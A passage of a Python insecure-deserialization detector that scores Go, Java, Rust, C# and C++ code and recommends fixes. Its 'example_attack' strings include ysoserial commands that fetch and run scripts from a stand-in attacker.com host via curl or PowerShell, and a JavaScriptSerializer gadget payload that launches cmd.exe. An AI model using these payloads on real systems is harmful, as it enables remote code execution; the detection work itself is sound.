                    "description": "Go gob.Decode() without type validation - DESERIALIZATION ATTACK: gob can deserialize arbitrary types. Attacker can craft malicious gob-encoded data with unexpected types that bypass application logic or trigger code execution through interface methods. ATTACK: Send gob data with malicious type implementing interfaces with dangerous methods (e.g., io.Reader/Writer that access filesystem). IMPACT: Type confusion attacks, arbitrary object instantiation, potential RCE through interface method calls.",
                    "recommendation": "Add type validation after decode: var data MyType; if err := decoder.Decode(&data); err != nil { return err }; // Validate type matches expected structure. Use type assertions/switches to verify decoded type. Consider using allowlist of permitted types.",
                    "example_attack": "Attacker sends gob data claiming to be SafeConfig but is actually MaliciousType with Write() method that accesses /etc/passwd. Application calls Write() → file access.",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "gob.Decode() used to deserialize data",
                            "No type validation or type switch after deserialization",
                            "Attacker can control gob-encoded input data",
                            "Application doesn't verify decoded type matches expected structure"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: gob.Decode() without type validation",
                            "gob can deserialize any Go type encoded in the data",
                            "No type switch or type assertion to verify decoded type",
                            "Attacker can send gob data with unexpected types",
                            "Type confusion can bypass security checks or trigger unintended methods"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "gob.Decode() usage",
                            "Type validation (type switch, type assertion)",
                            "Error checking after decode",
                            "Allowlist of permitted types"
                        ],
                        "evidence": {
                            "found_patterns": ["gob.Decode without type validation"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: json.Unmarshal without type checking
        json_unmarshal_locations = find_pattern_locations(code, r'json\.Unmarshal\(')

        if json_unmarshal_locations:
            # Check for validation or type checking
            has_validation = any([
                re.search(r'if.*!=.*nil', code),  # Error checking
                re.search(r'if.*\w+\s*==\s*["\']', code),  # Field value validation
                re.search(r'switch.*\w+', code),  # Type/field switch
            ])

            # Check if unmarshaling into interface{} (dangerous)
            uses_interface = re.search(r'interface\{\}|var\s+\w+\s+interface', code)

            if uses_interface and not has_validation:
                location = json_unmarshal_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "MEDIUM",
                    "description": "Go json.Unmarshal into interface{} without validation - TYPE CONFUSION RISK: Unmarshaling into interface{} accepts any JSON structure. Attacker can send unexpected types/fields that bypass application logic. While JSON is safer than gob (no arbitrary code execution), type confusion can lead to logic bugs, authentication bypass, or DoS.",
                    "recommendation": "Unmarshal into concrete struct types instead of interface{}: type Config struct { Field string }; var cfg Config; json.Unmarshal(data, &cfg). If you must use interface{}, add strict validation: check field types, validate all fields against allowlist, reject unexpected fields.",
                    "example_attack": "Application expects {\"role\": \"user\"} but attacker sends {\"role\": [\"admin\", \"user\"]}. Type changes from string to array → type assertion fails differently → logic bug → privilege escalation.",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "json.Unmarshal() used with interface{} type",
                            "No type checking or validation after unmarshal",
                            "Accepts any JSON structure from untrusted source",
                            "Type confusion can bypass application logic"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: json.Unmarshal into interface{{}} without validation",
                            "interface{} accepts any JSON type (object, array, string, number, bool)",
                            "No validation of actual decoded type or structure",
                            "Attacker can send unexpected types to trigger type assertion failures",
                            "Type confusion can bypass authentication, authorization, or business logic"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "json.Unmarshal into interface{}",
                            "Type validation after unmarshal",
                            "Concrete struct types (safer)",
                            "Field validation and type assertions"
                        ],
                        "evidence": {
                            "found_patterns": ["json.Unmarshal into interface{} without validation"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 0:
                    self.score = 1

        # Pattern 3: Check for safe usage
        uses_concrete_types = re.search(r'type\s+\w+\s+struct\s*\{', code)
        has_json_with_struct = uses_concrete_types and json_unmarshal_locations

        if has_json_with_struct and self.score == 2:
            location = json_unmarshal_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "SECURE: Uses json.Unmarshal with concrete struct types. JSON only supports data primitives (object, array, string, number, bool, null), cannot execute code. Concrete structs provide type safety and validation.",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "gob.Decode without type validation (arbitrary type deserialization)",
                        "json.Unmarshal into interface{} (type confusion)",
                        "No validation of deserialized data structure",
                        "Accepting unexpected types from untrusted sources"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses json.Unmarshal with concrete struct type",
                        "JSON format is data-only, cannot represent code or arbitrary objects",
                        "Struct definition enforces expected field types and structure",
                        "Go's type system validates deserialized data matches struct definition",
                        "No gob usage (which allows arbitrary type deserialization)"
                    ],
                    "patterns_checked": [
                        "gob.Decode usage and type validation",
                        "json.Unmarshal with interface{} vs concrete types",
                        "Struct type definitions",
                        "Type validation patterns"
                    ],
                    "evidence": {
                        "found_patterns": ["json.Unmarshal with concrete struct type"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_java(self, code: str) -> Dict:
        """Analyze Java code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Check if code uses ObjectInputStream
        uses_deserialize = re.search(r'ObjectInputStream|readObject', code)
        if not uses_deserialize:
            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}

        # Pattern 1: ObjectInputStream.readObject without validation
        readobject_locations = find_pattern_locations(code, r'\.readObject\(\)')

        if readobject_locations:
            # Check for validation patterns
            has_validation = any([
                re.search(r'ValidatingObjectInputStream', code),
                re.search(r'ObjectInputFilter|setObjectInputFilter', code),
                re.search(r'instanceof', code),  # Type checking
                re.search(r'ALLOWED_CLASSES|allowedClasses|whitelist', code, re.IGNORECASE),
            ])

            location = readobject_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            if not has_validation:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "CRITICAL",
                    "description": "Java ObjectInputStream.readObject() without validation - REMOTE CODE EXECUTION: Java deserialization can execute arbitrary code during object reconstruction. ATTACK: Attacker sends malicious serialized object with gadget chain (e.g., Commons Collections, Spring Framework) that executes commands. REAL-WORLD: CVE-2015-7501 (JBoss), CVE-2017-3066 (Adobe), CVE-2017-5638 (Apache Struts) all used Java deserialization RCE. IMPACT: Complete server compromise, data exfiltration, ransomware, botnet recruitment. Java deserialization is the #1 most dangerous vulnerability class in enterprise Java apps.",
                    "recommendation": "NEVER deserialize untrusted data with ObjectInputStream. Solutions: (1) Use JSON/XML instead: ObjectMapper mapper = new ObjectMapper(); obj = mapper.readValue(json, MyClass.class), (2) If you MUST use Java serialization: Use ValidatingObjectInputStream with strict class allowlist: ValidatingObjectInputStream ois = new ValidatingObjectInputStream(in); ois.accept(MyAllowedClass.class); obj = ois.readObject(), (3) Use ObjectInputFilter (Java 9+): ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\"com.myapp.**;!*\"); ois.setObjectInputFilter(filter)",
                    "example_attack": "Attacker crafts malicious payload using ysoserial tool: java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/shell.sh | bash' | base64. Sends to vulnerable endpoint → readObject() reconstructs gadget chain → Runtime.exec() called during deserialization → RCE before application code even runs. Gadget chains exist in: Commons Collections, Spring, Groovy, Apache Commons, Hibernate.",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "ObjectInputStream.readObject() called on untrusted data",
                            "No ValidatingObjectInputStream or ObjectInputFilter protection",
                            "No class allowlist validation",
                            "Java deserialization gadget chains in classpath (Commons Collections, Spring, etc.)"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: ObjectInputStream.readObject() without validation",
                            "Java deserialization automatically invokes methods during object reconstruction",
                            "Gadget chains abuse legitimate library code to achieve RCE (e.g., InvokerTransformer.transform() → Runtime.exec())",
                            "No ValidatingObjectInputStream or ObjectInputFilter to restrict allowed classes",
                            "Attacker can craft payload using public tools (ysoserial, marshalsec)",
                            "RCE occurs during deserialization, before application validation can run",
                            "REAL-WORLD: Used in Equifax breach, Apache Struts RCE, JBoss exploits"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "ObjectInputStream.readObject() usage",
                            "ValidatingObjectInputStream (safe wrapper)",
                            "ObjectInputFilter (Java 9+ protection)",
                            "instanceof type checking after deserialize",
                            "Class allowlist validation (ALLOWED_CLASSES)"
                        ],
                        "evidence": {
                            "found_patterns": ["ObjectInputStream.readObject without validation"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: Check for ValidatingObjectInputStream (secure)
        validating_locations = find_pattern_locations(code, r'ValidatingObjectInputStream')
        filter_locations = find_pattern_locations(code, r'ObjectInputFilter|setObjectInputFilter')

        if (validating_locations or filter_locations) and self.score == 2:
            location = validating_locations[0] if validating_locations else filter_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "SECURE: Uses ValidatingObjectInputStream or ObjectInputFilter with class allowlist. Restricts deserialization to approved classes only, preventing gadget chain attacks. This is the correct way to handle Java deserialization if you cannot migrate to JSON.",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "ObjectInputStream.readObject() on untrusted data (gadget chain RCE)",
                        "No class allowlist or validation",
                        "Dangerous gadget libraries in classpath",
                        "No ObjectInputFilter protection"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses ValidatingObjectInputStream or ObjectInputFilter",
                        "Class allowlist restricts deserialization to approved classes only",
                        "Gadget chain attacks blocked because malicious classes rejected",
                        "ValidatingObjectInputStream.accept() defines permitted classes",
                        "ObjectInputFilter provides runtime validation of deserialized classes"
                    ],
                    "patterns_checked": [
                        "ObjectInputStream.readObject() without validation",
                        "ValidatingObjectInputStream usage",
                        "ObjectInputFilter (Java 9+)",
                        "Class allowlist patterns"
                    ],
                    "evidence": {
                        "found_patterns": ["ValidatingObjectInputStream or ObjectInputFilter"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_rust(self, code: str) -> Dict:
        """Analyze Rust code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Check if code uses serde or deserialization
        uses_deserialize = re.search(r'serde::|Deserialize|from_str|from_slice', code)
        if not uses_deserialize:
            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}

        # Pattern 1: Deserialize without validation
        deserialize_locations = []
        deserialize_patterns = [
            r'from_str\(',
            r'from_slice\(',
            r'from_reader\(',
            r'deserialize\(',
        ]

        for pattern in deserialize_patterns:
            deserialize_locations.extend(find_pattern_locations(code, pattern))

        if deserialize_locations:
            # Check for validation patterns
            has_validation = any([
                re.search(r'#\[serde\(validate\)', code),  # Custom validation
                re.search(r'\.validate\(\)', code),  # Explicit validation
                re.search(r'if\s+.*\.is_ok\(\)', code),  # Result checking
                re.search(r'match.*\{', code),  # Pattern matching for validation
            ])

            # Check for custom Deserialize implementation with validation
            has_custom_deserialize = re.search(r'impl.*Deserialize.*for.*\{', code, re.DOTALL)
            has_validation_in_impl = has_custom_deserialize and any([
                re.search(r'return\s+Err', code),
                re.search(r'Err\(.*Error', code),
                re.search(r'bail!|ensure!', code),  # Error macros
            ])

            location = deserialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            if not has_validation and not has_validation_in_impl:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "MEDIUM",
                    "description": "Rust serde deserialization without validation - LOGIC BUGS & DoS RISK: While Rust's type safety prevents memory corruption, deserializing untrusted data without validation can cause logic bugs, resource exhaustion, or DoS. ATTACK SCENARIOS: (1) Attacker sends huge arrays/strings → memory exhaustion → OOM DoS, (2) Nested structures with extreme depth → stack overflow, (3) Invalid business logic values bypass application checks (e.g., negative prices, out-of-range enums). IMPACT: Application crashes, resource exhaustion, business logic bypass, data corruption.",
                    "recommendation": "Add validation after deserialization: (1) Use #[serde(validate)] attribute with validator crate, (2) Implement custom Deserialize with validation logic: impl<'de> Deserialize<'de> for MyType { fn deserialize<D>(deserializer: D) -> Result<Self, D::Error> { let value = Value::deserialize(deserializer)?; if value.field < 0 { return Err(...); } Ok(...) } }, (3) Use type constraints (NonZeroU32, bounded integers), (4) Add size/depth limits to prevent DoS",
                    "example_attack": "Application expects Product { price: u32, quantity: u32 }. Attacker sends { price: 4294967295, quantity: 4294967295 }. Both valid u32 but multiplication overflows → panic → DoS. OR: Attacker sends deeply nested JSON (100 levels deep) → stack overflow → crash. OR: Attacker sends 2GB array → OOM → DoS.",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "serde deserialization without validation",
                            "No #[serde(validate)] attribute",
                            "No custom Deserialize implementation with bounds checking",
                            "No size/depth limits on deserialized data",
                            "Business logic assumes valid ranges but doesn't enforce them"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: Deserialization without validation",
                            "Rust type system prevents memory corruption but not logic bugs",
                            "No validation of value ranges, sizes, or business constraints",
                            "Attacker can send extreme values within valid type ranges",
                            "No protection against resource exhaustion (huge arrays, deep nesting)",
                            "ATTACK VECTORS: DoS via OOM, stack overflow, logic bugs via extreme values"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "from_str/from_slice/deserialize usage",
                            "#[serde(validate)] attribute",
                            "Custom Deserialize implementation with validation",
                            "Result checking and error handling",
                            "Type constraints (NonZeroU32, bounded types)"
                        ],
                        "evidence": {
                            "found_patterns": ["Deserialization without validation"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 0:
                    self.score = 1

        # Pattern 2: Check for secure patterns
        has_type_constraints = re.search(r'NonZero|Bounded|RangeInclusive', code)
        has_validation_attr = re.search(r'#\[serde\(validate\)', code)
        has_result_checking = re.search(r'\.is_ok\(\)|\.is_err\(\)|match.*Result', code)

        if (has_type_constraints or has_validation_attr or has_result_checking) and self.score == 2 and deserialize_locations:
            location = deserialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            protections = []
            if has_type_constraints:
                protections.append("Type constraints (NonZero, Bounded)")
            if has_validation_attr:
                protections.append("#[serde(validate)] attribute")
            if has_result_checking:
                protections.append("Result validation")

            protections_str = " + ".join(protections) if protections else "validation"

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": f"SECURE: Uses serde deserialization with {protections_str}. Rust's type system prevents memory corruption. Additional validation prevents logic bugs and DoS attacks from malformed data.",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "Deserialization without validation (logic bugs, DoS)",
                        "No type constraints on numeric ranges",
                        "No size/depth limits",
                        "Missing business logic validation"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses deserialization with {protections_str}",
                        "Rust's type system ensures memory safety",
                        "Validation prevents out-of-range values and logic bugs",
                        "Type constraints enforce valid ranges at compile/runtime",
                        "Result checking handles deserialization errors safely"
                    ],
                    "patterns_checked": [
                        "Deserialization without validation",
                        "Type constraints usage",
                        "#[serde(validate)] attribute",
                        "Result/error handling"
                    ],
                    "evidence": {
                        "found_patterns": [f"Deserialization with {protections_str}"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_csharp(self, code: str) -> Dict:
        """Analyze C# code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Check if code uses deserialization
        uses_deserialize = re.search(r'BinaryFormatter|JavaScriptSerializer|Deserialize|XmlSerializer', code)
        if not uses_deserialize:
            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}

        # Pattern 1: BinaryFormatter.Deserialize (extremely dangerous)
        binaryformatter_locations = find_pattern_locations(code, r'BinaryFormatter')
        deserialize_locations = find_pattern_locations(code, r'\.Deserialize\(')

        if binaryformatter_locations and deserialize_locations:
            location = binaryformatter_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "CRITICAL",
                "description": "C# BinaryFormatter.Deserialize() - REMOTE CODE EXECUTION: BinaryFormatter is so dangerous Microsoft deprecated it completely. ATTACK: Similar to Java deserialization, uses gadget chains (e.g., ObjectDataProvider, WindowsIdentity) to achieve RCE during deserialization. REAL-WORLD: CVE-2017-8759 (.NET), CVE-2019-0604 (SharePoint), CVE-2020-1147 (.NET Framework) all used BinaryFormatter RCE. MICROSOFT GUIDANCE: 'BinaryFormatter is dangerous and should not be used. It cannot be secured, even when using a SerializationBinder.' IMPACT: Complete server compromise, lateral movement in Active Directory, credential theft.",
                "recommendation": "IMMEDIATELY STOP using BinaryFormatter. Microsoft's official guidance: (1) Migrate to JSON: JsonSerializer.Deserialize<T>(json) (System.Text.Json), (2) If you need binary format: Use MessagePack, protobuf-net, or Bond instead, (3) If you MUST deserialize .NET objects: Use DataContractSerializer with known types allowlist (still risky): [DataContract] public class MyClass { ... }; var serializer = new DataContractSerializer(typeof(MyClass), new Type[] { typeof(MyClass) }); obj = serializer.ReadObject(stream)",
                "example_attack": "Attacker crafts malicious payload using ysoserial.net: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'powershell IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")' | base64. Sends to endpoint → BinaryFormatter.Deserialize() → gadget chain executes → PowerShell downloads and runs attacker's script → RCE. Gadget chains: ObjectDataProvider, WindowsIdentity, PSObject.",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "BinaryFormatter.Deserialize() called",
                        "Microsoft officially deprecated BinaryFormatter as insecure",
                        "Cannot be secured even with SerializationBinder",
                        ".NET gadget chains available (ysoserial.net)"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: BinaryFormatter.Deserialize() usage",
                        "BinaryFormatter automatically invokes methods during deserialization",
                        "Gadget chains abuse .NET framework classes to achieve RCE",
                        "ObjectDataProvider gadget can invoke arbitrary methods with parameters",
                        "No safe way to use BinaryFormatter - Microsoft deprecated it entirely",
                        "SerializationBinder validation can be bypassed with gadget chains",
                        "REAL-WORLD: Used in Exchange Server exploits, SharePoint RCE, .NET Framework CVEs"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "BinaryFormatter usage (always vulnerable)",
                        "JavaScriptSerializer (also vulnerable)",
                        "DataContractSerializer with known types (safer)",
                        "JSON serializers (System.Text.Json, Newtonsoft.Json with TypeNameHandling.None)"
                    ],
                    "evidence": {
                        "found_patterns": ["BinaryFormatter.Deserialize"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 2: JavaScriptSerializer (also vulnerable)
        javaserializer_locations = find_pattern_locations(code, r'JavaScriptSerializer')

        if javaserializer_locations and deserialize_locations and self.score > 0:
            location = javaserializer_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "HIGH",
                "description": "C# JavaScriptSerializer.Deserialize() - TYPE CONFUSION & RCE RISK: JavaScriptSerializer with __type metadata can deserialize arbitrary .NET types. ATTACK: Attacker sends JSON with __type field pointing to dangerous types (ObjectDataProvider, FileSystemUtils). IMPACT: RCE via gadget chains, type confusion attacks, information disclosure.",
                "recommendation": "Stop using JavaScriptSerializer (deprecated). Use System.Text.Json instead: JsonSerializer.Deserialize<MyClass>(json) with specific types. If using Newtonsoft.Json: NEVER use TypeNameHandling.All or TypeNameHandling.Auto: var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None }; JsonConvert.DeserializeObject<T>(json, settings)",
                "example_attack": "Attacker sends: {\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\", \"MethodName\":\"Start\", \"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System\"}, \"MethodParameters\":{\"__type\":\"System.Collections.ArrayList\", \"$values\":[\"cmd.exe\", \"/c calc\"]}} → JavaScriptSerializer deserializes ObjectDataProvider → invokes Process.Start(\"cmd.exe\", \"/c calc\") → RCE",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "JavaScriptSerializer usage (deprecated)",
                        "Deserializes __type metadata from JSON",
                        "Can instantiate arbitrary .NET types",
                        "Vulnerable to gadget chain attacks"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: JavaScriptSerializer usage",
                        "JavaScriptSerializer respects __type JSON field to deserialize arbitrary types",
                        "Attacker controls type instantiation via __type metadata",
                        "Can trigger gadget chains (ObjectDataProvider, FileSystemUtils)",
                        "Microsoft deprecated JavaScriptSerializer in favor of System.Text.Json"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "JavaScriptSerializer usage",
                        "BinaryFormatter usage",
                        "System.Text.Json (safe default)",
                        "Newtonsoft.Json with TypeNameHandling.None"
                    ],
                    "evidence": {
                        "found_patterns": ["JavaScriptSerializer"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 3: Check for DataContractSerializer with known types (safer)
        datacontract_locations = find_pattern_locations(code, r'DataContractSerializer')
        known_types_locations = find_pattern_locations(code, r'knownTypes|KnownTypes')

        if datacontract_locations and known_types_locations and self.score == 2:
            location = datacontract_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "SECURE: Uses DataContractSerializer with known types allowlist. Restricts deserialization to approved types only. Still has some risk (prefer System.Text.Json) but much safer than BinaryFormatter/JavaScriptSerializer.",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "BinaryFormatter.Deserialize (gadget chain RCE)",
                        "JavaScriptSerializer (type confusion via __type)",
                        "No type allowlist or validation",
                        "Arbitrary type instantiation"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses DataContractSerializer with known types",
                        "Known types allowlist restricts deserialization to approved types",
                        "Cannot deserialize arbitrary types from attacker-controlled data",
                        "Safer than BinaryFormatter and JavaScriptSerializer"
                    ],
                    "patterns_checked": [
                        "BinaryFormatter usage",
                        "JavaScriptSerializer usage",
                        "DataContractSerializer with known types",
                        "System.Text.Json (recommended)"
                    ],
                    "evidence": {
                        "found_patterns": ["DataContractSerializer with known types"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # Pattern 4: Check for System.Text.Json (safe)
        json_serializer_locations = find_pattern_locations(code, r'System\.Text\.Json|JsonSerializer\.Deserialize')

        if json_serializer_locations and self.score == 2:
            location = json_serializer_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "SECURE: Uses System.Text.Json which is safe by default. Does not support type metadata (__type) by default, preventing arbitrary type instantiation. This is Microsoft's recommended JSON serializer for .NET Core/.NET 5+.",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "BinaryFormatter (RCE via gadget chains)",
                        "JavaScriptSerializer (type confusion)",
                        "Arbitrary type deserialization",
                        "No type validation"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses System.Text.Json",
                        "System.Text.Json does not support type metadata by default",
                        "Cannot deserialize arbitrary types from JSON",
                        "No gadget chain attacks possible",
                        "Microsoft's recommended secure JSON serializer"
                    ],
                    "patterns_checked": [
                        "BinaryFormatter usage",
                        "JavaScriptSerializer usage",
                        "System.Text.Json (safe)",
                        "DataContractSerializer patterns"
                    ],
                    "evidence": {
                        "found_patterns": ["System.Text.Json usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_cpp(self, code: str) -> Dict:
        """Analyze C/C++ code for insecure deserialization/parsing."""
        self.vulnerabilities = []
        self.score = 2

        # C/C++ doesn't have native deserialization like Python pickle or Java ObjectInputStream
        # But there are unsafe parsing patterns that can be exploited

        # Pattern 1: Manual binary data parsing without validation
        unsafe_parse_patterns = [
            (r'memcpy\([^,]+,\s*[^,]+,\s*[^)]+\)', "memcpy without bounds checking"),
            (r'strcpy\([^,]+,\s*[^)]+\)', "strcpy without size limit"),
            (r'sprintf\([^,]+,.*%s', "sprintf with %s format specifier"),
            (r'sscanf\([^,]+,.*%s', "sscanf with unbounded %s"),
            (r'gets\(', "gets() function (always unsafe)"),
        ]

        for pattern, description in unsafe_parse_patterns:
            locations = find_pattern_locations(code, pattern)
            if locations:
                # Check for validation
                has_validation = any([
                    re.search(r'if\s*\([^)]*\s*(len|size|strlen|sizeof)', code),
                    re.search(r'strncpy|snprintf|fgets', code),
                    re.search(r'assert\(|check_bounds|validate', code, re.IGNORECASE),
                ])

                if not has_validation:
                    location = locations[0]
                    line_num = location['line_number']
                    code_snippet = location['line_content']

                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "HIGH",
                        "description": f"C/C++ {description} - BUFFER OVERFLOW RISK: Manual data parsing without validation can lead to buffer overflows and memory corruption. ATTACK: Attacker provides oversized input → function writes beyond buffer bounds → memory corruption → potential code execution. IMPACT: Remote code execution, denial of service, memory corruption.",
                        "recommendation": "Use safe alternatives: (1) Use strncpy instead of strcpy, (2) Use snprintf instead of sprintf, (3) Use fgets instead of gets, (4) Always validate input size before memcpy: if (size <= MAX_SIZE) memcpy(...), (5) Consider using C++ std::string instead of char arrays",
                        "example_attack": f"Attacker sends input larger than buffer → {description} writes beyond bounds → stack/heap corruption → RCE via return address overwrite",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                f"{description} called without size validation",
                                "No bounds checking before copying data",
                                "Missing input validation or sanitization",
                                "Buffer overflow potential from unchecked input"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: {description} without validation",
                                "No size checking detected before data operation",
                                "Attacker can provide oversized input causing buffer overflow",
                                "Memory corruption can lead to code execution",
                                "Classic C/C++ vulnerability pattern"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "memcpy/strcpy/sprintf/gets usage",
                                "strncpy/snprintf/fgets (safe alternatives)",
                                "Size validation (if/strlen/sizeof checks)",
                                "bounds checking functions"
                            ],
                            "evidence": {
                                "found_patterns": [description],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0

        # Pattern 2: JSON/XML parsing without validation
        parsing_libs = []
        if re.search(r'#include\s+[<"]json|rapidjson|nlohmann', code):
            parsing_libs.append("JSON")
        if re.search(r'#include\s+[<"]xml|tinyxml|pugixml|libxml', code):
            parsing_libs.append("XML")

        if parsing_libs:
            # Check for validation after parsing
            has_validation = any([
                re.search(r'\.is\w+\(\)|\.has\w+\(\)|\.contains\(', code),
                re.search(r'if\s*\([^)]*\.(type|empty|size)\(\)', code),
                re.search(r'try\s*\{.*parse.*\}\s*catch', code, re.DOTALL),
            ])

            parse_locations = []
            parse_locations.extend(find_pattern_locations(code, r'\.parse\('))
            parse_locations.extend(find_pattern_locations(code, r'\.load\('))
            parse_locations.extend(find_pattern_locations(code, r'\.decode\('))

            if parse_locations and not has_validation:
                location = parse_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                libs_str = " and ".join(parsing_libs)
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "MEDIUM",
                    "description": f"C/C++ {libs_str} parsing without validation - TYPE CONFUSION RISK: Parsing without type/structure validation can lead to logic errors or DoS. ATTACK: Attacker sends malformed JSON/XML → application crashes or behaves unexpectedly. While C++ type safety prevents memory corruption, missing validation can cause logic bugs.",
                    "recommendation": f"Add validation after parsing: (1) Check field types: if (json.is_string()), (2) Validate required fields: if (json.contains('field')), (3) Use try-catch for parse errors: try {{ json.parse(...) }} catch (parse_error& e) {{ ... }}, (4) Set size limits to prevent DoS",
